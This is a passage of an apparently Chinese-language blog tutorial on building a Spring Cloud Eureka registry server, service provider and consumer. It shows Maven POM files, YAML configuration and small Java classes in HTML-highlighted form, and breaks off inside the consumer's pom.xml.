class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t<span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.whh.springcloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>eureka-server<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>eureka-server<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>Demo project for Spring Boot<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.9.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">relativePath</span>/&gt;</span> <span class=\"comment\">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.build.sourceEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">java.version</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">java.version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">spring-cloud.version</span>&gt;</span>Edgware.SR1<span class=\"tag\">&lt;/<span class=\"name\">spring-cloud.version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-eureka-server<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-dependencies<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">type</span>&gt;</span>pom<span class=\"tag\">&lt;/<span class=\"name\">type</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>import<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>reousece&#x2F;application.yml 如下：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">eureka-server</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8761</span></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">instance:</span></span><br><span class=\"line\">    <span class=\"attr\">hostname:</span> <span class=\"string\">localhost</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"comment\">#不注册eureka</span></span><br><span class=\"line\">    <span class=\"attr\">register-with-eureka:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"comment\">#不从eureka获取信息</span></span><br><span class=\"line\">    <span class=\"attr\">fetch-registry:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"attr\">serviceUrl:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/</span></span><br></pre></td></tr></table></figure>\n<p>EurekaDiscoveryApplication.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"meta\">@EnableEurekaClient</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">EurekaDiscoveryApplication</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">\t\tSpringApplication.run(EurekaDiscoveryApplication.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动EurekaDiscoveryApplication后，打开localhost:8761访问eureka web页面。</p>\n<h3 id=\"Eureka-Discovery-（服务提供）\"><a href=\"#Eureka-Discovery-（服务提供）\" class=\"headerlink\" title=\"Eureka Discovery （服务提供）\"></a>Eureka Discovery （服务提供）</h3><p>新建项目，用于提供服务。<br>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t<span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.whh.springcloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>eureka-discovery<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>eureka-discovery<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>Demo project for Spring Boot<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.9.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">relativePath</span>/&gt;</span> <span class=\"comment\">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.build.sourceEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">java.version</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">java.version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">spring-cloud.version</span>&gt;</span>Edgware.SR1<span class=\"tag\">&lt;/<span class=\"name\">spring-cloud.version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-dependencies<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">type</span>&gt;</span>pom<span class=\"tag\">&lt;/<span class=\"name\">type</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>import<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>resource&#x2F;application.yml</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">eureka-discovery</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8762</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">service-url:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://localhost:8761/eureka/</span></span><br><span class=\"line\">    <span class=\"attr\">healthcheck:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>Main主类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"meta\">@EnableEurekaClient</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">EurekaDiscoveryApplication</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">\t\tSpringApplication.run(EurekaDiscoveryApplication.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>新增Controller提供服务</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;demo&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;home&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">home</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String name)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;welcome &quot;</span> + name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动服务，之后可以在Eureka Server Web页面查看到服务列表.</p>\n<ul>\n<li>在启动过程中，如果之后服务提供者重启，之后web页面可能会出现错误信息，这是Eureka启动了<strong>自我保护模式</strong>，可以通过<strong>eureka.server.enable-self-preservation &#x3D; false</strong>禁用保护模式</li>\n</ul>\n<h3 id=\"eureka-consumer-（消费客户端）\"><a href=\"#eureka-consumer-（消费客户端）\" class=\"headerlink\" title=\"eureka consumer （消费客户端）\"></a>eureka consumer （消费客户端）</h3><p>建立服务消费者，新建maven项目<br>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t<span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.whh.springcloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>consumer-client<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>consumer-client<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>Demo project for Spring Boot<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.9.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">relativePath</span>/&gt;</span> <span class=\"comment\">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.build.sourceEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.reporting.outputEncoding</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">java.version</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">java.version</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">spring-cloud.version</span>&gt;</span>Edgware.SR1<span class=\"tag\">&lt;/<span class=\"name\">spring-cloud.version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--&lt;dependency&gt;--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!--&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!--&lt;artifactId&gt;spring-cloud-starter-ribbon&lt;/artifactId&gt;--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--&lt;/dependency&gt;--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span 